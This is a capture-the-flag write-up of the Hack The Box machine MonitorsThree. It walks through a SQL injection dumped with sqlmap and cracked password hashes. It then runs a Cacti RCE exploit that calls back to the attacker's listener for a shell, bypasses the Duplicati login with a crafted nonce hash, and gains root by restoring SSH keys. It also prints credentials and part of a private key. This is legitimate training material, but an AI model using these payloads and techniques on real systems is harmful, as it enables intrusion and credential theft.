# HTB - MonitorsThree

#### Ip: 10.10.11.158
#### Name: MonitorsThree
#### Rating: Medium

----------------------------------------------------------------------

![htb_monitors3_card.png](../assets/monitorsthree_assets/htb_monitors3_card.png)

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ sudo nmap -p- -sC -sV --min-rate=10000 10.129.231.115 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-24 15:14 CDT
Nmap scan report for 10.129.231.115
Host is up (0.083s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86f87d6f4291bb897291af72f301ff5b (ECDSA)
|_  256 50f9ed8e73649eaaf6089514f0a60d57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.11 seconds
```

Let's add monitorsthree.htb to `/etc/hosts`.

Looking at the page on port 80 we find a site offering networking solutions:

![htb_monitors3_site.png](../assets/monitorsthree_assets/htb_monitors3_site.png)

Fuzzing directories we find http://monitorsthree.htb/admin/navbar.php, which interestingly we can access, but cannot click on to any of the links without first authenticating.


Scanning for vhosts we discover cacti.monitorsthree.htb, which we can also add to `/etc/hosts`.

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ ffuf -u http://monitorsthree.htb -H 'HOST: FUZZ.monitorsthree.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 3598 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 3598
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
    * FUZZ: cacti

:: Progress: [19966/19966] :: Job [1/1] :: 573 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```

Scanning this vhost with nikto, several files are found:

![htb_monitors3_nikto.png](../assets/monitorsthree_assets/htb_monitors3_nikto.png)

But they all appear to be default files and not to contain anything of interest.

I'm also seeing several vulnerabilities/ RCEs against this version number of cacti, but they all appear to require authentication, so it seems those will have to wait.

Going back to the drawing board and inspecting the "Forgot Password" feature on the main site, we discover a potential SQL injection.

Entering a single `'` character gets us an interesting error:

![htb_monitors3_syntax.png](../assets/monitorsthree_assets/htb_monitors3_syntax.png)

### Exploitation

Let's capture this in Burp and feed it into SQLMap to help enumerate this further:

![htb_monitors3_sqlmap1.png](../assets/monitorsthree_assets/htb_monitors3_sqlmap1.png)

```
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 3756 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=';SELECT SLEEP(5)#
---
[17:24:54] [INFO] the back-end DBMS is MySQL
[17:24:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
```

Cool, we've found an injection.

Let's now run:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3  -p username --dbms mysql --threads 10 --dbs
<SNIP>
available databases [2]:
[*] information_schema
[*] monitorsthree_db
```

Ok, nice. Let's use sqlmap to look at the monitorsthree_db database.

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3  -p username --dbms mysql --threads 10 -D monitorsthree_db --tables
<SNIP>
Database: monitorsthree_db
[6 tables]
+---------------+
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
| users         |
+---------------+
```

Lets dump the users table:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3  -p username --dbms mysql --threads 10 -D monitorsthree_db -T users --dump
```

And after seemingly an eternity, we've got our hashes:

![htb_monitors3_hashes.png](../assets/monitorsthree_assets/htb_monitors3_hashes.png)

Dropping these into crackstation, we find we can crack the admin hash: `greencacti2001`

![htb_monitors3_cracked.png](../assets/monitorsthree_assets/htb_monitors3_cracked.png)

Now that we have this credential we can revisit some of the authenticated RCE exploits discovered earlier in enumeration.

Let's use: https://www.exploit-db.com/exploits/52225

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ python cacti_rce.py --url http://cacti.monitorsthree.htb/cacti --user 'admin' --password 'greencacti2001' --lhost 10.10.14.234 --lport 9001
```

We can launch the exploit and catch as shell as www-data:

![htb_monitors3_shell.png](../assets/monitorsthree_assets/htb_monitors3_shell.png)

However it still looks like we'll need to escalate privileges or move laterally to access the user.txt flag:

```
www-data@monitorsthree:/$ cd /home
www-data@monitorsthree:/home$ ls
marcus
www-data@monitorsthree:/home$ cd marcus
bash: cd: marcus: Permission denied
```

Cheching out the cacti config file located at: `/var/www/html/cacti/include/config.php`  is a great place to start, and inside we find some mysql creds:

```
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
```

We can use these to login and further enumerate the cacti db. Inside we find a table called `user_auth` which contains some hashes:

![htb_monitors3_db.png](../assets/monitorsthree_assets/htb_monitors3_db.png)

We can use john to crack one of these:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt               
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678910      (?)`
```

And we can use this string of numbers as a password for marcus:

```
www-data@monitorsthree:~/html/cacti/include$ su marcus
Password: 
marcus@monitorsthree:/var/www/html/cacti/include$ whoami
marcus
```

From here we can grab the first flag:

![htb_monitors3_user.png](../assets/monitorsthree_assets/htb_monitors3_user.png)

I'll also grab marcus' SSH key for persistence:

```
marcus@monitorsthree:~/.ssh$ ls -la
total 20
drwx------ 2 marcus marcus 4096 Aug 20  2024 .
drwxr-x--- 4 marcus marcus 4096 Aug 16  2024 ..
-rw------- 1 marcus marcus  574 Aug 20  2024 authorized_keys
-rw------- 1 marcus marcus 2610 Aug 20  2024 id_rsa
-rw-r--r-- 1 marcus marcus  574 Aug 20  2024 id_rsa.pub
marcus@monitorsthree:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqgvIpzJXDWJOJejC3CL0m9gx8IXO7UBIfGplG1XCC6GhqPQh8OXK
rPkApFwR1k4oJkxQJi0fG2oSWmssfwqwY4FWw51sNIALbSIV3UIlz8/3ufN0zmB4WHacS+
k7hOP/rJ8GjxihThmh6PzC0RbpD/wCCCvF1qX+Bq8xc7797xBR4KfPaA9OgB0uvEuzVWco
<SNIP>
```

### Privilege Escalation

Looking around the box we find some interesting files in `/opt`:

```
marcus@monitorsthree:/opt/duplicati/config$ ls
control_dir_v2  CTADPNHLTC.sqlite  Duplicati-server.sqlite
```

Let's transfer these files back locally using `wget`:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ wget 10.129.231.115:8888/Duplicati-server.sqlite
--2025-07-25 15:49:53--  http://10.129.231.115:8888/Duplicati-server.sqlite
Connecting to 10.129.231.115:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90112 (88K) [application/vnd.sqlite3]
Saving to: ‘Duplicati-server.sqlite’

Duplicati-server.sqlite         100%[====================================================>]  88.00K  --.-KB/s    in 0.1s    

2025-07-25 15:49:54 (630 KB/s) - ‘Duplicati-server.sqlite’ saved [90112/90112]

                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ wget 10.129.231.115:8888/CTADPNHLTC.sqlite      
--2025-07-25 15:50:07--  http://10.129.231.115:8888/CTADPNHLTC.sqlite
Connecting to 10.129.231.115:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2461696 (2.3M) [application/vnd.sqlite3]
Saving to: ‘CTADPNHLTC.sqlite’

CTADPNHLTC.sqlite               100%[====================================================>]   2.35M  2.41MB/s    in 1.0s    

2025-07-25 15:50:09 (2.41 MB/s) - ‘CTADPNHLTC.sqlite’ saved [2461696/2461696]
```

```
marcus@monitorsthree:/opt/duplicati/config$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.14.234 - - [25/Jul/2025 20:49:54] "GET /Duplicati-server.sqlite HTTP/1.1" 200 -
10.10.14.234 - - [25/Jul/2025 20:50:08] "GET /CTADPNHLTC.sqlite HTTP/1.1" 200 -
```

Browsing this file I find two interesting hashes for duplicati in `options`:

![htb_monitors3_sql2.png](../assets/monitorsthree_assets/htb_monitors3_sql2.png)

Not exactly sure what to do with these, I find a detailed writeup of utilizing these to bypass login for duplicati: https://read.martiandefense.llc/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee

Before following this let's confirm that duplicati is actually running:

```
marcus@monitorsthree:/opt/duplicati/config$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:44177        0.0.0.0:*            
tcp    LISTEN  0       70           127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       500            0.0.0.0:8084         0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:8200         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       511               [::]:80              [::]:*            
tcp    LISTEN  0       128               [::]:22              [::]:*
```

Let's set up the port forward:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsThree]
└─$ ssh -L 8200:127.0.0.1:8200 marcus@10.129.231.115 -i marcus_id_rsa
```

And we can see the duplicati login screen:

![htb_monitors3_duplicati.png](../assets/monitorsthree_assets/htb_monitors3_duplicati.png)

Let's now base64 decode and convert to hex the passphrase found in the sqlite file:

![htb_monitors3_chef.png](../assets/monitorsthree_assets/htb_monitors3_chef.png)

Let's now capture a login attempt after enabling "Do Intercept" the response and sending it to Repeater:

```
POST /login.cgi HTTP/1.1
Host: 127.0.0.1:8200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 11
Origin: http://127.0.0.1:8200
Connection: close
Referer: http://127.0.0.1:8200/login.html
Cookie: session-nonce=nfToyGTehxCj5nYAbtnQuc9ZvB3TB6iaom%2BcD9aiBko%3D; xsrf-token=D7HQGkM876729jT3Og0gNnlTmJ9VQxs2oly0TjZY2nE%3D
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

get-nonce=1
```

The response:

![htb_monitors3_response.png](../assets/monitorsthree_assets/htb_monitors3_response.png)

From here let's grab the hex encoded pw and the nonce from the burp response and create:

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('W6xDd8WM4MxgkxT7HfL3LUCN46Ls2bB8GbWLoO0P0vc=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```

We can then open the devtools and in the console type "allow pasting" and paste in the above:

![htb_monitors3_dev.png](../assets/monitorsthree_assets/htb_monitors3_dev.png)

After entering the noncedpwd var, we can then type `noncedpwd`, intercept the request, and update the password field with the string provided in devtools:

![htb_monitors3_forward.png](../assets/monitorsthree_assets/htb_monitors3_forward.png)

We can forward this request, disable burp, and are logged into duplicati:

![htb_monitors3_in.png](../assets/monitorsthree_assets/htb_monitors3_in.png)

Nice. 

So looks like there is a backup cronjob in place for cacti here.

Let's try exploiting this functionality by selecting "Add Backup" then "Configure a new backup". We'll name this one test and select "no encryption."

![htb_monitors3_backup1.png](../assets/monitorsthree_assets/htb_monitors3_backup1.png)

We know that the host machine is `/source`, so lets set the backup destination as `/source/root/.ssh`

![htb_monitors3_destinaton.png](../assets/monitorsthree_assets/htb_monitors3_destination.png)

![htb_monitors3_source.png](../assets/monitorsthree_assets/htb_monitors3_source.png)

and adding "Add Path"

Hitting "next" I will un-select "Automatically run backups"

I can hit Save and then see my backup. I'll select "Run now"

![htb_monitors3_run.png](../assets/monitorsthree_assets/htb_monitors3_run.png)

From here we can select more options using the down arrow, and click on "restore files"

Let's select `/source/home/marcus/authorized_keys` and restore them to `/source/root/.ssh`

Once this is done we can simply SSH in as user root using marcus' SSH key and grab the final flag.

![htb_monitors3_root.png](../assets/monitorsthree_assets/htb_monitors3_root.png)

Thanks for following along!

-Ryan

---------------------------------------
